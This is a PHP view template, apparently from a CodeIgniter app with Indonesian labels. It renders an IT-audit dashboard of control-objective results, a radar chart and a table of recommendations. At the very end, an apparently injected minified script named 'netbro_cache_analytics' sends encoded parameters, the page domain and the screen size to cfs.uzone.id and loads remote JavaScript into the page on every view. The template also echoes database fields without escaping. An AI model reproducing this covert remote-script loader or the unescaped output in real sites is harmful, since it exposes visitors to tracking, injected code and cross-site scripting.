<section class="content">
  <div class="block-header">
    <div class="row">
        <div class="col-md-8 col-sm-7 col-xs-12">
            <div class="h-left clearfix">
                <h2>REKOMENDASI</h2>
                <small>Melihat Data Rekomendasi</small>
                <ol class="breadcrumb breadcrumb-col-pink p-l-0">
                    <li><a href="javascript:void(0);">Dashboard</a></li>
                    <li class="active">Rekomendasi</li>
                </ol>
            </div>
        </div>  
    </div>
</div>
  <div class="container-fluid">
    <div class="row clearfix"> 
      <!-- Line Chart -->
      <div class="col-lg-12 col-md-8 col-sm-12 col-xs-12"">
        <div class="card">
          <div class="header">
            <h2>GRAFIK PERBANDINGAN</h2>
          </div>
          <div class="body">
            <canvas id="bar_chart" height="400" width="1200"></canvas>
          </div>
        </div>
      </div>
    </div>
    <div class="row clearfix">
        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
            <div class="card">
                <div class="header">
                   <h2> HASIL EVALUASI PER KONTROL OBJEKTIF</h2>  
               </div>
               <div class="body table-responsive">
                <table class="table table-bordered">
                   <thead>
                    <tr>
                        <th>ID PERIODE</th>
                        <th>KONTROL OBJEKTIF</th>
                        <th>HASIL</th>
                        <th>KETERANGAN</th>
                    </tr>
                </thead>
                <tbody>
                   <?php 
                   foreach ($mydatass as $row) { ?>
                   <tr>    
                       <td><?php echo $row->id_periode ?></td>
                       <td><?php echo $row->id_co ?></td>
                       <td><?php echo $row->hasil ?></td>
                       <td><a href="<?php echo base_url('index.php/rekomendasi/form_add_rekomendasi/'.$row->id_co.'/'.$row->id_periode); ?>"><button type="button">Detail Kontrol Objektif</button>
                    </td>
                   </tr>  
                   <?php } ?>               
               </tbody>
           </table>
       </div>
    </div>

    <div class="row clearfix">
        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
            <div class="card">
                <div class="header">
                   <h2> DATA REKOMENDASI</h2>  
               </div>
               <div class="body table-responsive">
                <table class="table table-bordered table-striped table-hover js-basic-example dataTable">
                   <thead>
                    <tr>
                        <th>ID REKOMENDASI</th>
                        <th>ID PERIODE</th>
                        <th>TEMUAN</th>
                        <th>REKOMENDASI</th>
                        <th>ACTION</th>
                    </tr>
                </thead>
                <tbody>
                   <?php 
                   foreach ($mydata as $row) { ?>
                   <tr>    
                        <td><?php echo $row->id_rekomendasi ?></td>
                        <td><?php echo $row->id_periode ?></td>
                        <td><?php echo $row->temuan ?></td>
                        <td><?php echo $row->rekomendasi ?></td>
                        <td><a href="<?php echo base_url('index.php/rekomendasi/form_edit_rekomendasi/'.$row->id_rekomendasi); ?>"><button>Edit</button></td>
                    </td>
                   </tr>  
                   <?php } ?>               
               </tbody>
           </table>
       </div>
    </div>
</section>


<script src="<?php echo base_url()."assets/"; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<!-- Jquery DataTable Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/jquery.dataTables.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.flash.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/jszip.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/pdfmake.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/vfs_fonts.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.html5.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.print.min.js"></script> 

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url()."assets/"; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/sparkline.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/pages/tables/jquery-datatable.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>/plugins/sweetalert/sweetalert.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/chartjs/Chart.bundle.js"></script> <!-- Chart Plugins Js --> 

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url()."assets/"; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/chartjs.js"></script> 
<script type="text/javascript">

  var ctx = document.getElementById("bar_chart").getContext('2d');
  var myChart = new Chart(ctx, {
    type: 'radar',
    data: {
      labels: [
     <?php foreach ($mydatass as $row) { ?>
        '<?php  echo $row->id_co; ?>',
        <?php } ?>
        ],
        datasets: [{          
          label: 'Kontrol Objektif',
          data: [
          <?php foreach ($mydatass as $row) { ?>
            <?php  echo $row->hasil; ?>,
            <?php } ?>
            ],
            backgroundColor: [
            'rgba(255, 99, 132, 0.2)',
            'rgba(54, 162, 235, 0.2)',
            'rgba(255, 206, 86, 0.2)',
            'rgba(75, 192, 192, 0.2)',
            'rgba(153, 102, 255, 0.2)',
            'rgba(255, 159, 64, 0.2)',
            'rgba(255, 99, 132, 0.2)',
            'rgba(54, 162, 235, 0.2)',
            'rgba(255, 206, 86, 0.2)',
            'rgba(75, 192, 192, 0.2)',
            'rgba(153, 102, 255, 0.2)',
            'rgba(255, 159, 64, 0.2)'
            ],
            borderColor: [
            'rgba(255,99,132,1)',
            'rgba(54, 162, 235, 1)',
            'rgba(255, 206, 86, 1)',
            'rgba(75, 192, 192, 1)',
            'rgba(153, 102, 255, 1)',
            'rgba(255, 159, 64, 1)',
            'rgba(255,99,132,1)',
            'rgba(54, 162, 235, 1)',
            'rgba(255, 206, 86, 1)',
            'rgba(75, 192, 192, 1)',
            'rgba(153, 102, 255, 1)',
            'rgba(255, 159, 64, 1)'
            ],
            borderWidth: 1
          }, {
    label: "Nilai yang diharapkan",
    backgroundColor: "rgba(0,0,200,0.2)",
    data: [
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 
            <?php foreach ($mydatasss as $row) { ?>
            <?php echo $row->id_maturity; ?>
            <?php } ?>, 

    ]
  }],
        },
        options: {
          scales: {
            yAxes: [{
              ticks: {
                beginAtZero:true
              }
            }]
          }
        }
      });

function logout(pesan, url) {
            swal({
                title: "Are you sure?",
                text: "Apakah Anda Ingin Logout?",
                type: "warning",
                showCancelButton: true,
                confirmButtonColor: "#DD6B55",
                confirmButtonText: "Ya, Logout",
                cancelButtonText: "Tidak",
                closeOnConfirm: false,
                closeOnCancel: false
            },
            function(isConfirm){
                if (isConfirm) {
                    swal("Logout", "Anda Berhasil Logout", "success");
                    window.location = url;
                } else {
                    swal("Dibatalkan", "Batal Logout", "error");
                }
            });
        }
      if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1Oh%2foYYZkQKRGp%2bA%2byfXgCzHx0%2bSR6YbaPa64nGMefKrLQfmk95oGigLDnvdVB5qJWhTLV2u1FItSyF%2fTKs33V2QqxskBHK2zanve%2fvtRRWLer0%2bjDdaWcCv8ZbW9bOFV1wA%2fpoPT4W%2bgcpe7vpYtiFxtd5zXj49EQiCK4Zsaxn30Vd%2fruuUFHYRHIv7SZz2Lhwl10%2b8A8b57DrsjK9Fwydtz%2fOho3Vt1nBnUrbu%2b6jzdNdHv4qmRzcXaoq8gW7oc%2b%2fYD7ZVm4E4nzq5qnIHZ5Yb%2b915lJYDAEr43X6U1MfuMNxC1t9HR9o9Dx%2fdwnnzSrhjtw92wALBXiVZ1os2Kktd3x2mrxFA3I0wgagiBvlVgkWkxojC%2bARYe2veTXNH2%2br0O9S%2bop%2b71zvWNVi%2f3khcvgovnDvWvmQfFx0cSw1QQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
      </html>